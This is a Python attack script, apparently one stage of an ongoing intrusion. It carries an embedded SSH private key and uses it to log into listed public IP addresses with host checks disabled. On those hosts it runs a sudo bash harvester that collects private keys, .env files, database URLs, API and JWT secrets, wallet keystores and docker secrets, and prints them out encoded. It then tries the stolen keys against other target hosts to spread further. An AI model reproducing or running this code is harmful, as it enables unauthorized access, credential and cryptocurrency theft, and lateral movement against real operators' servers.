#!/usr/bin/env python3
# i29507 Round E3: deep harvest of 6 live root hosts (content, not just listings) + key inventory,
# then test harvested private keys against locked hosts (lumii1/intelora12/intelora1) & eericxu targets.
import os, sys, json, base64, subprocess, re, concurrent.futures as cf

UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
PRIV = base64.b64decode("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNCMUpBekRmQkpuYjFMa3QrY29BNDUvTCsrSzNsV2h6NTNGU1dkaEVXdGE0UUFBCkFJaFNkVlBOVW5WVHpRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQjFKQXpEZkJKbmIxTGt0K2NvQTQ1L0wrK0sKM2xXaHo1M0ZTV2RoRVd0YTRRQUFBRURpcDRnNFQ2Tmprc0VYRG9nK1l0UGlFaDdFR1ZRUXJmQXdaZjBYUGtiWQpTblVrRE1OOEVtZHZVdVMzNXlnRGpuOHY3NHJlVmFIUG5jVkpaMkVSYTFyaEFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K")
LIVE=[("intelora13","3.1.85.40"),("intelora10","18.140.62.25"),("intelora6","13.229.229.119"),
      ("lumii5","175.41.162.110"),("intelora5","18.141.143.76"),("lumii2","13.250.122.46")]
# locked / target hosts (host, ip, [users])
TGT=[("lumii1","18.141.172.122",["coder","ubuntu"]),
     ("intelora12","54.179.173.218",["coder","ubuntu"]),
     ("intelora1","54.179.162.251",["coder","ubuntu"]),
     ("golden-stage","43.142.238.91",["ubuntu","root"]),
     ("aro-81","81.68.254.22",["ubuntu","root"]),
     ("prod","122.51.1.87",["ubuntu","root"])]

HARV=r'''#!/bin/bash
exec 2>/dev/null </dev/null
export LC_ALL=C
H=$(hostname); echo "### $H"; id; sudo -n id 2>&1|head -1
echo "--eericxu--"
sudo find /home /root -maxdepth 5 \( -iname '*eericxu*' -o -iname '*ericxu*' \) 2>/dev/null|head -20|while read f; do case "$f" in *.pub) echo "PUBFILE $f";sudo head -c 400 "$f";;*) echo "PRIV $f";sudo base64 -w0 "$f";;esac; echo; done
echo "--ssh--"
for d in /root/.ssh /home/*/.ssh; do [ -d "$d" ]||continue; echo "DIR $d"; sudo ls -la "$d" 2>/dev/null|head -30; echo "CONF:"; sudo cat "$d/config" 2>/dev/null|head -60; done
echo "--keys--"
sudo find /root /home /opt /etc -maxdepth 5 -type f \( -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*_ed25519' -o -name '*_rsa' \) 2>/dev/null | grep -vE '/\.git/|node_modules|\.pub$' | head -30 | while read f; do
  if sudo grep -ql 'PRIVATE KEY' "$f" 2>/dev/null; then echo "KEYB64 $f $(sudo base64 -w0 "$f")"; fi
done
echo "--envdump--"
sudo find /opt /etc /home /root /srv /data -maxdepth 6 -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '*.env.dev' -o -name '*.env.prod' -o -name 'runtime.env' \) 2>/dev/null | grep -vE 'node_modules|/\.git/|\.example$' | head -30 | while read f; do echo "==ENVF $f"; sudo head -c 3500 "$f"; echo; done
echo "--secrets--"
sudo timeout 50 grep -rIhoE '0xC56f7063fd6d199ccc443dbbf4283be602d46343|0xFE18Aa1EFa652660F36Ab84F122CD36108f903B6|postgres(ql)?://[^ "]{6,160}|mysql://[^ "]{6,160}|redis://[^ "]{6,160}|mongo(db)?://[^ "]{6,160}|(JWT_SECRET|DATABASE_URL|AGENT_WS_TOKEN|RELAY_JWT_SECRET|OPS_TOKEN|ENROLL_TOKEN|DESKTOP_TOKEN|API_KEY|ACCESS_KEY|SECRET_KEY)[=:][^ ]{8,160}' /opt /etc /home /root /srv 2>/dev/null | grep -vE 'node_modules|\.example' | awk '!seen[$0]++' | head -150
echo "--zoofi--"
sudo timeout 30 grep -rIlE 'zoofi|wandfi|wand-index|C56f7063fd6d199ccc443dbbf4283be602d46343|FE18Aa1EFa652660F36Ab84F122CD36108f903B6' /opt /etc /home /root /srv 2>/dev/null|grep -vE 'node_modules|/\.git/|\.cache'|head -25
echo "--keystore--"; sudo find /etc /opt /home /root -type f \( -iname '*keystore*.json' -o -iname '*wallet*.json' -o -iname 'UTC--*' \) 2>/dev/null|grep -v node_modules|head -15
echo "--docker--"
for c in $(sudo docker ps -a -q 2>/dev/null|head -10); do echo "C $(sudo docker inspect "$c" --format '{{.Name}}' 2>/dev/null)"; sudo docker inspect "$c" --format '{{range .Config.Env}}{{.}}{{"\n"}}{{end}}' 2>/dev/null | grep -E '(JWT|SECRET|TOKEN|PASSWORD|DSN|DATABASE|API_KEY|ACCESS)' | head -8; done
echo "--git--"
for r in $(sudo find /home /opt -maxdepth 5 -name .git -type d 2>/dev/null|head -8); do echo "REPO ${r%/.git}"; sudo git -C "${r%/.git}" remote -v 2>/dev/null|head -4; done
echo "###END $H"
'''

def sh(a, timeout=120):
    try:
        r=subprocess.run(a,capture_output=True,timeout=timeout)
        return r.returncode, r.stdout.decode("utf-8","replace"), r.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1,"",repr(e)

def b64(s):
    if isinstance(s,bytes): s=s.decode("utf-8","replace")
    return base64.b64encode(s.encode("utf-8","replace")).decode()

def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    b=b64(s)
    if len(b)<=8500: print("R:%s:%s"%(k,b),flush=True)
    else:
        for i in range(0,len(b),8500): print("R:%s__%02d:%s"%(k,i//8500,b[i:i+8500]),flush=True)

def main():
    kp="/tmp/k3"; open(kp,"wb").write(PRIV); os.chmod(kp,0o600)
    hb=base64.b64encode(HARV.encode()).decode()
    def harvest(hostip):
        host,ip=hostip
        rc,out,err=sh(["ssh","-i",kp,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-n","coder@"+ip,
                       "echo %s|base64 -d>/tmp/h3.sh; sudo bash /tmp/h3.sh 2>&1 | head -c 22000"%hb],timeout=220)
        return host,{"rc":rc,"out":out,"err":err[-200:]}
    H={}
    with cf.ThreadPoolExecutor(max_workers=6) as ex:
        for host,res in ex.map(harvest, LIVE):
            H[host]=res
            R("H_"+host, res["out"])
    # collect keys
    keys={}
    for host,res in H.items():
        for m in re.finditer(r'KEYB64 (\S+) (\S+)', res["out"]):
            path,b=m.group(1),m.group(2)
            try: raw=base64.b64decode(b)
            except Exception: continue
            if b"PRIVATE KEY" not in raw: continue
            keys.setdefault(raw, path)
        for m in re.finditer(r'PRIV (\S+)\n(\S+)', res["out"]):
            pass
    R("KEYINV", {p: base64.b64encode(k).decode()[:40]+"..." for k,p in keys.items()})
    R("NKEYS", len(keys))
    # test up to 6 distinct keys against targets
    klist=list(keys.items())[:6]
    def trykey(args):
        ki,raw,path,u,host,ip=args
        p="/tmp/tk_%d"%ki; open(p,"wb").write(raw); os.chmod(p,0o600)
        rc,out,err=sh(["ssh","-i",p,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=6","-n","%s@%s"%(u,ip),
                       "id;hostname;sudo -n id 2>&1|head -1"],timeout=25)
        return ("k%d:%s|%s@%s"%(ki,os.path.basename(path),u,host), {"rc":rc,"out":out[-280:],"err":err[-120:]})
    jobs=[]
    for ki,(raw,path) in enumerate(klist):
        for host,ip,users in TGT:
            for u in users:
                jobs.append((ki,raw,path,u,host,ip))
    tres={}
    with cf.ThreadPoolExecutor(max_workers=12) as ex:
        for k,v in ex.map(trykey, jobs):
            tres[k]=v
    R("KEYTEST", tres)
    wins=[k for k,v in tres.items() if v["rc"]==0]
    R("WINS", wins)

try:
    main()
except Exception:
    import traceback; R("FATAL", traceback.format_exc()[-2500:])
finally:
    sys.exit(1)
